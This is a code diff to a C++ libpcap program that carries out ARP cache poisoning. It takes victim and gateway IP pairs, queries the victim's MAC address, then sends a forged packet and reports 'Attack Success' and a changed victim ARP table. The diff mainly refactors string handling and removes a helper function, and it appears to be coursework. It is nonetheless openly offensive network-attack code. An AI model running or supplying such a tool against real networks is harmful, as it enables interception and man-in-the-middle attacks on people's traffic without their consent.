@@ -8,6 +8,8 @@
 #include <net/if.h>
 #include <unistd.h>
 
+#include <iostream>
+
 #pragma pack(push, 1)
 
 struct EthArpPacket final {
@@ -33,6 +35,7 @@ bool get_s_ip(char* dev, char* ip) {
 	close(s);
 
 	Ip my_ip = Ip(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
+
 	std::string str = std::string(my_ip);
 
 	if (str.length() > 0) {
@@ -54,32 +57,6 @@ bool get_s_mac(char* dev, char* mac) {
 	}
 	
 	return false;
-}
-
-bool get_d_mac(pcap_t* handle, char* s_mac, char* s_ip, char* d_ip, char* d_mac) {
-	EthArpPacket packet;
-
-	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
-	packet.eth_.smac_ = Mac(s_mac);
-	packet.eth_.type_ = htons(EthHdr::Arp);
-
-	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-	packet.arp_.pro_ = htons(EthHdr::Ip4);
-	packet.arp_.hln_ = Mac::SIZE;
-	packet.arp_.pln_ = Ip::SIZE;
-	packet.arp_.op_ = htons(ArpHdr::Request);
-	packet.arp_.smac_ = Mac(s_mac);
-	packet.arp_.sip_ = htonl(Ip(s_ip));
-	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
-	packet.arp_.tip_ = htonl(Ip(d_ip));
-
-	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-
-	if (res != 0) {
-		return false;
-	}
-
-	return true;
 }
 
 int main(int argc, char* argv[]) {
@@ -105,6 +82,7 @@ int main(int argc, char* argv[]) {
 		printf("couldn't get IP address\n");
 		return -1;
 	}
+	std::string s_ip_str = std::string(s_ip);
 
 	char s_mac[Mac::SIZE];
 	if (get_s_mac(dev, s_mac)) {
@@ -115,11 +93,9 @@ int main(int argc, char* argv[]) {
 	}
 
 	for(int i = 2; i < argc; i += 2) {
-		char victim_ip[Ip::SIZE], gateway_ip[Ip::SIZE];
-		char d_mac[Mac::SIZE];
-
-		strncpy(victim_ip, argv[i], Ip::SIZE);
-		strncpy(gateway_ip, argv[i+1], Ip::SIZE);
+		std::string victim_ip = std::string(argv[i]);
+		std::string gateway_ip = std::string(argv[i+1]);
+		std::string d_mac;
 
 		EthArpPacket packet;
 
@@ -133,7 +109,7 @@ int main(int argc, char* argv[]) {
 		packet.arp_.pln_ = Ip::SIZE;
 		packet.arp_.op_ = htons(ArpHdr::Request);
 		packet.arp_.smac_ = Mac(s_mac);
-		packet.arp_.sip_ = htonl(Ip(s_ip));
+		packet.arp_.sip_ = htonl(Ip(s_ip_str));
 		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
 		packet.arp_.tip_ = htonl(Ip(victim_ip));
 
@@ -157,9 +133,11 @@ int main(int argc, char* argv[]) {
 			EthHdr* eth = (EthHdr*)packet;
 			ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
 
-			if (eth->type() == EthHdr::Arp && arp->op() == ArpHdr::Reply && arp->sip() == Ip(victim_ip)) {
-				strncpy(d_mac, arp->smac().operator std::string().c_str(), Mac::SIZE);
-				printf("Sender MAC address: %s\n", d_mac);
+			std::string arp_sip = std::string(arp->sip());
+
+			if (eth->type() == EthHdr::Arp && arp->op() == ArpHdr::Reply && arp_sip.compare(victim_ip) == 0) {
+				d_mac = std::string(arp->smac());
+				printf("Target MAC address: %s\n", d_mac.c_str());
 				break;
 			}
 		}
@@ -173,7 +151,8 @@ int main(int argc, char* argv[]) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 		}
 		else {
-			printf("Attack Success\n");
+			printf("\nAttack Success\n");
+			printf("Change Victim(%s)'s ARP Table\n", victim_ip.c_str());
 		}
 	}
 
